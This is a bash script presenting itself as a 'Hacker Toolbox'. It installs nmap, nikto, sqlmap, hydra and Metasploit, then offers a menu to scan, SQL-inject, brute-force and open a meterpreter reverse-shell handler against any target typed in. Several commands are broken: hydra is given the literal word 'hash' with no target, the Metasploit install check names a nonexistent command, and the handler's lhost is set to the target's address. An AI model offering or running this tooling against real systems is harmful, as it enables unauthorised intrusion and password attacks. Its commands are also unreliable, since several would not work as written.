#!/bin/bash

# Welcome message
echo "Welcome to the Hacker Toolbox!"

# Check if tools are installed
if ! command -v curl &> /dev/null; then
  echo "curl is not installed. Installing..."
  sudo apt-get install curl -y
fi
if ! command -v wget &> /dev/null; then
  echo "wget is not installed. Installing..."
  sudo apt-get install wget -y
fi
if ! command -v nmap &> /dev/null; then
  echo "nmap is not installed. Installing..."
  sudo apt-get install nmap -y
fi
if ! command -v nikto &> /dev/null; then
  echo "nikto is not installed. Installing..."
  sudo apt-get install nikto -y
fi
if ! command -v sqlmap &> /dev/null; then
  echo "sqlmap is not installed. Installing..."
  sudo apt-get install sqlmap -y
fi
if ! command -v hydra &> /dev/null; then
  echo "hydra is not installed. Installing..."
  sudo apt-get install hydra -y
fi
if ! command -v metasploit-framework &> /dev/null; then
  echo "metasploit-framework is not installed. Installing..."
  sudo apt-get install metasploit-framework -y
fi

# Display the menu
while true; do
  clear
  echo "Hacker Toolbox"
  echo "1. Port Scanning"
  echo "2. Website Scanning"
  echo "3. SQL Injection"
  echo "4. Password Cracking"
  echo "5. Exploitation"
  echo "6. Exit"
  echo -n "Enter your choice: "
  read choice

  # Handle the user's choice
  case $choice in
    1)
      echo "Enter the target IP address: "
      read ip
      nmap -A $ip
      ;;
    2)
      echo "Enter the target website URL: "
      read url
      nikto -h $url
      ;;
    3)
      echo "Enter the target website URL: "
      read url
      sqlmap -u $url
      ;;
    4)
      echo "Enter the password hash: "
      read hash
      hydra -P /usr/share/wordlists/rockyou.txt -e ns hash
      ;;
    5)
      echo "Enter the target IP address: "
      read ip
      msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost $ip; set lport 4444; run"
      ;;
    6)
      echo "Exiting..."
      exit 0
      ;;
    *)
      echo "Invalid choice. Please enter a number from 1 to 6."
      ;;
  esac

  # Press any key to continue
  echo -n "Press any key to continue..."
  read -n 1
done
